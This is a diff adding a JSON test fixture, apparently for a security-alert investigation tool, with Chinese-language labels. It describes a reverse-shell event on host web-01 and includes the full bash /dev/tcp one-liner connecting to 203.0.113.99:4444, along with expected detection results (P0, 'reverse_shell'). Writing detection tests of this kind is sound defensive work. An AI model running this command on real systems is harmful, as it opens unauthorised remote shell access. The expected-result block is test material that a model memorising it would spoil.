@@ -1,0 +1,42 @@
+{
+  "investigation_intent": "web-01 443 端口监听进程出现反弹 shell 特征命令",
+  "scenario": "S5",
+  "risk_modules": ["exec"],
+  "params": {
+    "host": "web-01",
+    "time_start": "2026-06-21T10:00:00+08:00",
+    "time_end": "2026-06-21T11:00:00+08:00",
+    "severity_floor": "P1"
+  },
+  "completeness_precheck": {
+    "overall_verdict": "full_traceable",
+    "confidence": 0.9,
+    "next_skill_blocked": false
+  },
+  "evidence_bundles": {
+    "host_exec": [
+      {
+        "evidence_id": "exec-rs-001",
+        "event_type": "exec",
+        "host": "web-01",
+        "timestamp": "2026-06-21T10:22:11+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "listener_pid": 2345,
+        "pid": "6789",
+        "ppid": "2345",
+        "exe": "/bin/bash",
+        "command": ["/bin/bash", "-c", "bash -i >& /dev/tcp/203.0.113.99/4444 0>&1"],
+        "comm": "bash"
+      }
+    ],
+    "host_connect": [],
+    "host_file_op": []
+  },
+  "_meta": {
+    "scenario_label": "S5 反弹 shell /dev/tcp",
+    "expected_overall_verdict": "high_risk_detected",
+    "expected_highest_severity": "P0",
+    "expected_matched_rules": ["reverse_shell"]
+  }
+}
